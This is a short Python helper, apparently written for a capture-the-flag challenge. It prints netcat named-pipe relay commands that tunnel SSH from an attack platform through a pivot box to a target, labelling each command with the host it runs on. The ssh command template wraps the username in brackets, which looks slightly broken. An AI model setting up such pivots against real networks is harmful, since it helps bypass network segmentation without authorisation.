"""
Creates the commands for a netcat relay to SSH into a target via pivot machine.

Challenge reference: pc2/team/round1-2-boxes-4-shells
"""
import sys
import argparse
import textwrap


def parse_args(args: list):
    parser = argparse.ArgumentParser(prog="NetcatRelayPivot",
                                      description=sys.modules[__name__].__doc__)
    parser.add_argument("--you", default="ATTACK_PLATFORM", help="IP address of your attack platform")
    parser.add_argument("--pivot", default="PIVOT_BOX", help="IP address of the pivot box")
    parser.add_argument("--tgt", default="TARGET_BOX", metavar="TARGET", help="IP address of the target")
    parser.add_argument("--user", default="USER", metavar="TGTUSER", help="Username on the target box")
    return parser.parse_args(args)

def main():
    args = parse_args(sys.argv[1:])
    label(start_nc_relay, host=args.you)
    label(pivot_nc_relay, start_ip=args.you, tgt_ip=args.tgt, host=args.pivot)
    label(ssh_to_target, user=args.user, host=args.you)
    return


def label(func, host: str, root: bool = False, *args, **kwargs):
    """Wrap some output in a block designating the host it should be executed on."""
    prefix = f"==================== on {host} =================="
    print(prefix)
    if root:
        print("********************* (as root) ********************")
    print(func(*args, **kwargs))
    suffix = "---------------------------------------------------"
    print(suffix)
    return


def start_nc_relay(devname: str = "backpipe",
                   devtype: str = "p",
                   local_port: int = 2222,
                   remote_port: int = 22222
                   ) -> str:
    cmd = textwrap.dedent(f"""
    mknod {devname} {devtype}
    nc -lvp {local_port} 0<{devname} | nc -lvp {remote_port} | tee {devname}
    """)
    return cmd


def ssh_to_target(user: str = "user", dst_ip: str = "127.0.0.1", port: int = 22222) -> str:
    """Create the command to ssh to a target."""
    cmd = textwrap.dedent(f"""
    ssh [{user}]@{dst_ip} -p {port}
    """)
    return cmd


def pivot_nc_relay(start_ip: str,
                   tgt_ip: str,
                   tgt_port: int = 22,
                   local_port: int = 2222,
                   devname: str = "backpipe",
                   devtype: str = "p",
                   ) -> str:
    cmd = textwrap.dedent(f"""
    mknod {devname} {devtype}
    nc {tgt_ip} {tgt_port}  0<{devname} | nc {start_ip} {local_port} | tee {devname}
    """)
    return cmd


if __name__ == '__main__':
    main()
